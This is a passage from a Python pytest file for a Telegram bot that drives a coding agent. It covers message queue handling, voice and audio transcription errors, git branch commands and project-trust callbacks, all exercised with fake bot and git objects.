    edited = []
    query = SimpleNamespace(data="branchdiscrepancy:stored", answer=None, edit_message_text=None)

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch_discrepancy_callback(update, context))
    assert edited
    # Should offer restore method with keyboard
    assert edited[-1][1] is not None  # has keyboard


def test_ensure_active_session_ready_returns_false_when_session_not_dict(tmp_path: Path):
    """_ensure_active_session_ready_for_run returns False when session data is not a dict (line 257)."""
    import json, portalocker
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess1", "s", "backend", "codex")
    # Delete the session entry from the state file but leave active_session_id pointing to it
    lock = cfg.state_file.with_suffix(cfg.state_file.suffix + ".lock")
    with portalocker.Lock(str(lock), timeout=5):
        raw = json.loads(cfg.state_file.read_text())
        raw["chats"]["bot-a:123"]["sessions"].pop("sess1", None)
        cfg.state_file.write_text(json.dumps(raw))

    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    result = asyncio.run(router._ensure_active_session_ready_for_run(update, context))
    assert result is False


# ===========================================================================
# queue_processing.py — uncovered utility paths
# ===========================================================================


def test_decode_queue_body_returns_raw_when_no_prefix(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    assert router._decode_queue_body("plain text") == "plain text"


def test_preview_queued_message_truncates_at_3_chars(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    result = router._preview_queued_message("hello world", max_chars=3)
    assert result == "hel"


def test_preview_queued_message_appends_ellipsis_for_longer_truncation(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    result = router._preview_queued_message("a " * 60, max_chars=10)
    assert result.endswith("...")
    assert len(result) <= 10


def test_append_question_to_queue_file_appends_newline_when_file_nonempty(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    qf = tmp_path / "q.txt"
    router._append_question_to_queue_file(qf, "first message")
    router._append_question_to_queue_file(qf, "second message")
    questions = router._read_queue_questions(qf)
    assert len(questions) == 2
    assert questions[0].text == "first message"
    assert questions[1].text == "second message"


def test_dequeue_chat_message_file_returns_empty_when_file_empty(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    from collections import deque

    qf = tmp_path / "empty.txt"
    qf.write_text("", encoding="utf-8")  # empty file → no questions
    router._chat_message_queue_files[123] = deque([qf])

    file, questions = router._dequeue_chat_message_file(123)
    assert file is None
    assert questions == []


def test_next_queue_file_path_starts_at_zero_for_new_chat(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    path = router._next_queue_file_path(999)
    assert "queue-0" in path.name


def test_prompt_continue_queued_questions_early_exit_no_send_message(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    context = SimpleNamespace(bot=SimpleNamespace())  # no send_message attr
    asyncio.run(router._prompt_continue_queued_questions(123, context))  # should not raise


def test_prompt_queue_batch_decision_early_exit_no_send_message(tmp_path: Path):
    from coding_agent_telegram.router.queue_processing import QueuedQuestion
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    context = SimpleNamespace(bot=SimpleNamespace())  # no send_message attr
    msgs = [QueuedQuestion(text="q1"), QueuedQuestion(text="q2")]
    asyncio.run(router._prompt_queue_batch_decision(123, context, msgs))  # should not raise


def test_clear_chat_message_queue_removes_processing_and_pending(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    from collections import deque

    qf1 = tmp_path / "q1.txt"
    qf2 = tmp_path / "q2.txt"
    qf3 = tmp_path / "q3.txt"
    for f in [qf1, qf2, qf3]:
        f.write_text("", encoding="utf-8")

    router._chat_message_queue_files[123] = deque([qf1])
    router._chat_processing_queue_files[123] = qf2
    router._chat_pending_queue_decisions[123] = (qf3, [])

    router._clear_chat_message_queue(123)

    assert 123 not in router._chat_message_queue_files
    assert 123 not in router._chat_processing_queue_files
    assert 123 not in router._chat_pending_queue_decisions


def test_drain_queue_stops_when_project_busy(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    import asyncio as _asyncio
    _lock = _asyncio.Lock()
    asyncio.run(_lock.acquire())
    router._workspace_locks["backend"] = _lock

    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router._drain_chat_message_queue(123, context))  # should return immediately


def test_drain_queue_stops_when_pending_action_present(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_pending_action("bot-a", 123, {"kind": "message", "user_message": "hi"})
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router._drain_chat_message_queue(123, context))  # should return immediately


def test_drain_queue_stops_when_pending_queue_decision_present(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    qf = tmp_path / "q.txt"
    qf.write_text("", encoding="utf-8")
    router._chat_pending_queue_decisions[123] = (qf, [])

    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router._drain_chat_message_queue(123, context))  # should return immediately


def test_drain_queue_prompts_continue_when_last_result_aborted(tmp_path: Path):
    from coding_agent_telegram.router.queue_processing import QueuedQuestion
    from collections import deque
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    qf = tmp_path / "q.txt"
    router._append_question_to_queue_file(qf, "waiting question")
    router._chat_message_queue_files[123] = deque([qf])
    router._last_run_results[123] = SimpleNamespace(error_code="agent_aborted")

    sent = []

    async def fake_send_message(**kwargs):
        sent.append(kwargs)

    bot = SimpleNamespace(send_message=fake_send_message)
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router._drain_chat_message_queue(123, context))
    assert sent  # _prompt_continue_queued_questions was called


def test_drain_queue_skips_nested_call(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._chat_message_queue_draining.add(123)

    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router._drain_chat_message_queue(123, context))  # should return immediately without error


# ===========================================================================
# message_commands.py — _handle_audio_like missing lines
# ===========================================================================


def test_handle_audio_like_returns_early_when_message_is_none(tmp_path: Path):
    """_handle_audio_like must return early (line 103) when update.message is None."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router._handle_audio_like(update, context, None, media_kind="voice"))
    assert bot.messages == []


def test_handle_audio_like_sends_disabled_message_when_stt_disabled(tmp_path: Path):
    """_handle_audio_like must send STT disabled message (lines 110-111) when STT is off."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.speech_to_text.enabled = False

    fake_media = SimpleNamespace(file_unique_id="uid", file_size=100, file_name=None)
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text=None, photo=None, caption=None, voice=None, audio=fake_media),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router._handle_audio_like(update, context, fake_media, media_kind="voice"))
    assert bot.messages
    assert any("not enabled" in msg[1].lower() or "voice" in msg[1].lower() for msg in bot.messages)


def test_handle_audio_like_rejects_too_large_downloaded_content(tmp_path: Path):
    """_handle_audio_like must reject content (lines 149-158) when downloaded bytes exceed limit."""
    import os
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_audio", "audio-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.speech_to_text.enabled = True

    # Content is large (over 20MB) but declared_size is explicitly set to 0
    # so the early check won't trigger; the post-download check will
    from coding_agent_telegram.router.message_commands import MAX_STT_AUDIO_BYTES
    large_content = b"x" * (MAX_STT_AUDIO_BYTES + 1)
    fake_telegram_file = FakeTelegramFile(large_content, "voice.ogg")
    fake_media = FakeVoiceMessage(fake_telegram_file, file_size=0)  # 0 → early check skipped

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text=None, photo=None, caption=None, voice=fake_media, audio=None),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_voice(update, context))
    assert any("too large" in msg[1].lower() or "maximum" in msg[1].lower() for msg in bot.messages)


def test_handle_audio_like_sends_timeout_message_on_stt_timeout(tmp_path: Path):
    """_handle_audio_like must send timeout message (line 182) on STT timeout error."""
    from coding_agent_telegram.speech_to_text import SpeechToTextError
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_stt", "stt-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.speech_to_text.enabled = True
    router.speech_to_text.transcribe_file = lambda _path: (_ for _ in ()).throw(
        SpeechToTextError(code="timeout", detail="timed out", likely_first_download=False)
    )

    fake_content = b"audio-data"
    fake_telegram_file = FakeTelegramFile(fake_content, "voice.ogg")
    fake_voice = FakeVoiceMessage(fake_telegram_file)

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text=None, photo=None, caption=None, voice=fake_voice, audio=None),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_voice(update, context))
    assert any("timed out" in msg[1].lower() or "timeout" in msg[1].lower() or "conversion timed out" in msg[1].lower() for msg in bot.messages)


def test_handle_audio_like_adds_download_note_on_first_download(tmp_path: Path):
    """_handle_audio_like must add download note (line 186) when likely_first_download is True."""
    from coding_agent_telegram.speech_to_text import SpeechToTextError
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_stt", "stt-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.speech_to_text.enabled = True
    router.speech_to_text.transcribe_file = lambda _path: (_ for _ in ()).throw(
        SpeechToTextError(code="other", detail="failed", likely_first_download=True)
    )

    fake_content = b"audio-data"
    fake_telegram_file = FakeTelegramFile(fake_content, "voice.ogg")
    fake_voice = FakeVoiceMessage(fake_telegram_file)

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text=None, photo=None, caption=None, voice=fake_voice, audio=None),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_voice(update, context))
    assert any("download" in msg[1].lower() or "initial" in msg[1].lower() or "model" in msg[1].lower() for msg in bot.messages)


def test_handle_audio_like_sends_generic_error_on_unexpected_exception(tmp_path: Path):
    """_handle_audio_like must send generic error (lines 189-196) on unexpected exception."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_stt", "stt-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.speech_to_text.enabled = True
    router.speech_to_text.transcribe_file = lambda _path: (_ for _ in ()).throw(
        RuntimeError("unexpected failure")
    )

    fake_content = b"audio-data"
    fake_telegram_file = FakeTelegramFile(fake_content, "voice.ogg")
    fake_voice = FakeVoiceMessage(fake_telegram_file)

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text=None, photo=None, caption=None, voice=fake_voice, audio=None),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_voice(update, context))
    assert any("failed" in msg[1].lower() or "error" in msg[1].lower() for msg in bot.messages)


def test_handle_audio_like_returns_early_when_result_is_none(tmp_path: Path):
    """_handle_audio_like must return early (line 201) when result is None (workspace locked)."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_stt", "stt-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.speech_to_text.enabled = True
    # Return None to simulate workspace lock
    router.speech_to_text.transcribe_file = lambda _path: None

    fake_content = b"audio-data"
    fake_telegram_file = FakeTelegramFile(fake_content, "voice.ogg")
    fake_voice = FakeVoiceMessage(fake_telegram_file)

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text=None, photo=None, caption=None, voice=fake_voice, audio=None),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_voice(update, context))
    # Should not have any "transcript" messages - returned early
    assert not any("transcript" in msg[1].lower() for msg in bot.messages)


def test_handle_voice_returns_early_when_no_voice_message(tmp_path: Path):
    """handle_voice must return silently (line 250) when message has no voice."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text=None, photo=None, caption=None, voice=None, audio=None),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_voice(update, context))
    assert bot.messages == []


def test_handle_audio_returns_early_when_no_audio_message(tmp_path: Path):
    """handle_audio must return silently (line 256) when message has no audio."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text=None, photo=None, caption=None, voice=None, audio=None),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_audio(update, context))
    assert bot.messages == []


# ===========================================================================
# project_commands.py — _prompt_for_branch_source keyboard None (lines 109-120)
# ===========================================================================


def test_branch_command_reports_missing_source_when_no_branches_exist(tmp_path: Path):
    """_prompt_for_branch_source must send 'source missing' error (lines 109-120)
    when no source branches are found and source_branches is provided."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="main",
        default_branch="",
        local_branches=[],
    )

    update = make_update(text="/branch feature")
    bot = FakeBot()
    # New branch that doesn't exist, and no branches available
    context = SimpleNamespace(args=["feature"], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    assert any("source" in msg[1].lower() or "branch" in msg[1].lower() for msg in bot.messages)


# ===========================================================================
# project_commands.py — branch source missing for single source (lines 126-136)
# ===========================================================================


def test_branch_command_reports_source_missing_for_nonexistent_origin_branch(tmp_path: Path):
    """_prompt_for_branch_source must send 'source missing' error (lines 126-136)
    when source_branch doesn't exist locally or remotely."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="main",
        default_branch="main",
        local_branches=["main"],
    )

    update = make_update(text="/branch nonexistent feature")
    bot = FakeBot()
    # 2 args: source_branch=nonexistent, new_branch=feature
    context = SimpleNamespace(args=["nonexistent", "feature"], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    assert any("source" in msg[1].lower() or "missing" in msg[1].lower() for msg in bot.messages)


# ===========================================================================
# project_commands.py — refresh_result.success False (lines 185-186)
# ===========================================================================


def test_branch_command_reports_refresh_failure(tmp_path: Path):
    """_send_branch_selection_prompt must send error message (lines 185-186)
    when refresh_current_branch returns a failed result."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="main", local_branches=["main"])
    router.git.refresh_result = SimpleNamespace(success=False, message="Could not fetch")

    update = make_update(text="/branch")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    assert any("Could not fetch" in msg[1] or "fetch" in msg[1].lower() for msg in bot.messages)


# ===========================================================================
# project_commands.py — handle_project busy (line 231)
# ===========================================================================


def test_project_command_returns_early_when_project_busy(tmp_path: Path):
    """handle_project must return early (line 231) when project is busy."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    runner.has_running_process = lambda _project_path: True
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["backend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    assert any("busy" in msg[1].lower() or "running" in msg[1].lower() or "currently" in msg[1].lower() for msg in bot.messages)


# ===========================================================================
# project_commands.py — trust callback invalid decision (lines 361-362)
# ===========================================================================


def test_trust_callback_rejects_invalid_decision(tmp_path: Path):
    """handle_trust_project_callback must send error (lines 361-362)
    when decision is not 'yes' or 'no'."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    edited = []
    query = SimpleNamespace(data="trustproject:maybe:backend", answer=None, edit_message_text=None)

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append(text)

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_trust_project_callback(update, context))
    assert edited
    assert any("invalid" in e.lower() for e in edited)


# ===========================================================================
# project_commands.py — trust callback project missing (lines 367-368)
# ===========================================================================


def test_trust_callback_sends_error_when_project_missing(tmp_path: Path):
    """handle_trust_project_callback must send error (lines 367-368) when project folder missing."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    edited = []
    query = SimpleNamespace(data="trustproject:yes:nonexistent-proj", answer=None, edit_message_text=None)

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append(text)

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_trust_project_callback(update, context))
    assert edited
    assert any("missing" in e.lower() or "nonexistent" in e for e in edited)


# ===========================================================================
# project_commands.py — handle_branch busy (line 384)
# ===========================================================================


def test_branch_command_returns_early_when_project_busy(tmp_path: Path):
    """handle_branch must return early (line 384) when project is busy."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    runner.has_running_process = lambda _project_path: True
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/branch feature")
    bot = FakeBot()
    context = SimpleNamespace(args=["feature"], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    assert any("busy" in msg[1].lower() or "running" in msg[1].lower() or "currently" in msg[1].lower() for msg in bot.messages)


# ===========================================================================
# project_commands.py — handle_branch with 2 args (lines 415-417)
# ===========================================================================


def test_branch_command_with_two_args_shows_keyboard(tmp_path: Path):
    """handle_branch with 2 args sets source_branch and new_branch directly (lines 415-417)."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="main",
        default_branch="main",
        local_branches=["main"],
    )

    update = make_update(text="/branch main feature")
    bot = FakeBot()
    context = SimpleNamespace(args=["main", "feature"], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    # Should show branch source keyboard or message
    assert bot.messages or bot.sent_messages


# ===========================================================================
# project_commands.py — default_branch_unknown (lines 429-430)
# ===========================================================================


def test_branch_command_reports_unknown_default_branch(tmp_path: Path):
    """handle_branch must send 'default branch unknown' message (lines 429-430)
    when new branch doesn't exist and no current/default branch is available."""
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch=None,  # no current branch
        default_branch=None,  # no default branch
        local_branches=[],
    )

    update = make_update(text="/branch new-feature")
    bot = FakeBot()
    context = SimpleNamespace(args=["new-feature"], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    assert any("default branch" in msg[1].lower() or "unknown" in msg[1].lower() for msg in bot.messages)


# ===========================================================================
# project_commands.py — handle_branch_source_callback no query (line 449)
# ===========================================================================


def test_branch_source_callback_returns_when_query_is_none(tmp_path: Path):
    """handle_branch_source_callback must return silently (line 449) when query is None."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=None,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch_source_callback(update, context))
    assert bot.messages == []


# ===========================================================================
# project_commands.py — handle_branch_source_callback no project (lines 463-464)
# ===========================================================================


def test_branch_source_callback_sends_error_when_no_project_selected(tmp_path: Path):
    """handle_branch_source_callback sends 'no project selected' (lines 463-464)
    when no project is currently selected."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, local_branches=["main"])
    # Register a valid token
    token = router._register_branch_source_token("local", "main", "feature")

    edited = []
    query = SimpleNamespace(data=f"branchsource:{token}", answer=None, edit_message_text=None)

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append(text)

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch_source_callback(update, context))
    assert edited
    assert any("project" in e.lower() for e in edited)


# ===========================================================================
# project_commands.py — handle_branch_source_callback project missing (lines 468-471)
# ===========================================================================


def test_branch_source_callback_sends_error_when_project_folder_missing(tmp_path: Path):
    """handle_branch_source_callback sends project missing error (lines 468-471)
    when the project folder doesn't exist."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "nonexistent-project")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, local_branches=["main"])
    # Register a valid token
    token = router._register_branch_source_token("local", "main", "feature")

    edited = []
    query = SimpleNamespace(data=f"branchsource:{token}", answer=None, edit_message_text=None)

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append(text)

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch_source_callback(update, context))
    assert edited
    assert any("missing" in e.lower() or "nonexistent" in e for e in edited)


# ===========================================================================
# queue_processing.py — various edge case paths
# ===========================================================================


def test_decode_queue_body_returns_raw_when_no_base64_prefix(tmp_path: Path):
    """_decode_queue_body must return body unchanged (line 58) when no base64 prefix."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    result = router._decode_queue_body("raw text without prefix")
    assert result == "raw text without prefix"


def test_preview_queued_message_truncates_at_three_chars(tmp_path: Path):
    """_preview_queued_message handles max_chars <= 3 edge case (lines 167-169)."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    result = router._preview_queued_message("hello world", max_chars=2)
    assert result == "he"


def test_next_queue_file_path_returns_index_zero_on_fresh_state(tmp_path: Path):
    """_next_queue_file_path starts at index 0 (line 43) when neither queue exists."""
    runner = DummyRunner()
    cfg = make_config(tmp_path)
